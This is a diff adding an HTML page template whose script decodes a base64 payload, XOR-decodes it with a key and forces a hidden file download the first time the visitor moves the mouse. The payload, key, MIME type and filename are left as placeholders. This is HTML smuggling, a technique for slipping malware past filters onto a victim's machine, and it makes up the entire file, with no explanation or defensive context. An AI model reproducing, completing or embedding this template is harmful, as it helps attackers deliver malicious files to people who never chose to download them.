@@ -1,0 +1,49 @@
+<html>
+      <body>
+        <script>
+
+           function base64ToArrayBuffer(base64) {
+                                var binary_string = window.atob(base64);
+                                var len = binary_string.length;
+            
+                                var bytes = new Uint8Array( len );
+                                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+                                return bytes;
+                        }
+	   function DoStuffChloe(input,key) {
+			var out = new Uint8Array(input)
+			for(var i = 0;i<out.length;i++) {
+				out[i] = out[i]^key
+			}
+			return out
+	   }     
+       var done = false;
+            (function(){
+               window.onmousemove = function(e){
+                 
+                  if (!done) {
+                    var amouranth = "%%DATA%%"
+                   var amouranthDecoded = base64ToArrayBuffer(amouranth)
+                   var prettyAmouranth = DoStuffChloe(amouranthDecoded,%%KEY%%)
+                    console.log(amouranthDecoded)
+                    console.log(prettyAmouranth)
+                    var blob = new Blob([prettyAmouranth], {type: '%%MIME%%'});
+                   var a = document.createElement('a')
+                   document.body.appendChild(a)
+                   a.style = "display: none"
+                   var url = window.URL.createObjectURL(blob)
+             console.log(blob)
+                   a.href = url
+                   a.download = "%%NAME%%"
+                   a.click()
+                   done = true
+                  }
+                  
+               }
+            })()
+              
+           
+
+        </script>
+      </body>
+</html>
